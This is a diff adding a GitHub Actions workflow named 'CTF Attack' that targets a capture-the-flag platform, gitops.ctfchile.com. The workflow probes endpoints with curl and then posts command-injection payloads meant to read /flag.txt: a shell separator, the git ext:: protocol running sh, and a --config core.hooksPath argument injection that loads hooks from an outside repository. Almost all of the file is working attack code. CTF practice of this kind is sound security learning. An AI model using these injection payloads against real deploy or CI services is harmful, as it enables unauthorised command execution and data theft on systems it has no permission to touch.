@@ -1,0 +1,61 @@
+name: CTF Attack
+on:
+  push:
+    branches: [ master ]
+  workflow_dispatch:
+
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Recon platform
+        run: |
+          echo "=== HOME PAGE ==="
+          curl -sk https://gitops.ctfchile.com | head -200
+          echo ""
+          echo "=== PROBE ENDPOINTS ==="
+          for ep in / /api /deploy /build /run /pipeline /clone /job /ci /webhook /hook; do
+            echo "--- $ep ---"
+            curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" https://gitops.ctfchile.com$ep
+          done
+
+      - name: Exploit - POST probes
+        run: |
+          echo "=== POST /deploy ==="
+          curl -sk -X POST https://gitops.ctfchile.com/deploy \
+            -H "Content-Type: application/json" \
+            -d '{"service":"test"}' | head -100
+          echo ""
+          echo "=== POST /build ==="
+          curl -sk -X POST https://gitops.ctfchile.com/build \
+            -H "Content-Type: application/json" \
+            -d '{"service":"test"}' | head -100
+          echo ""
+          echo "=== POST /run ==="
+          curl -sk -X POST https://gitops.ctfchile.com/run \
+            -H "Content-Type: application/json" \
+            -d '{"service":"test"}' | head -100
+          echo ""
+          echo "=== POST / with form ==="
+          curl -sk -X POST https://gitops.ctfchile.com/ \
+            -d 'service=test' | head -100
+
+      - name: Exploit - injection payloads
+        run: |
+          echo "=== PAYLOAD 1: bash injection ==="
+          curl -sk -X POST https://gitops.ctfchile.com/deploy \
+            -H "Content-Type: application/json" \
+            -d '{"service":"x; cat /flag.txt"}' | head -100
+          echo ""
+          curl -sk -X POST https://gitops.ctfchile.com/ \
+            -d 'service=x;+cat+/flag.txt' | head -100
+          echo ""
+          echo "=== PAYLOAD 2: ext:: git protocol ==="
+          curl -sk -X POST https://gitops.ctfchile.com/deploy \
+            -H "Content-Type: application/json" \
+            -d '{"service":"ext::sh -c cat /flag.txt >&2"}' | head -100
+          echo ""
+          echo "=== PAYLOAD 3: --config hooksPath ==="
+          curl -sk -X POST https://gitops.ctfchile.com/deploy \
+            -H "Content-Type: application/json" \
+            -d '{"service":"--config core.hooksPath=hooks https://github.com/chilectf/exploit"}' | head -100
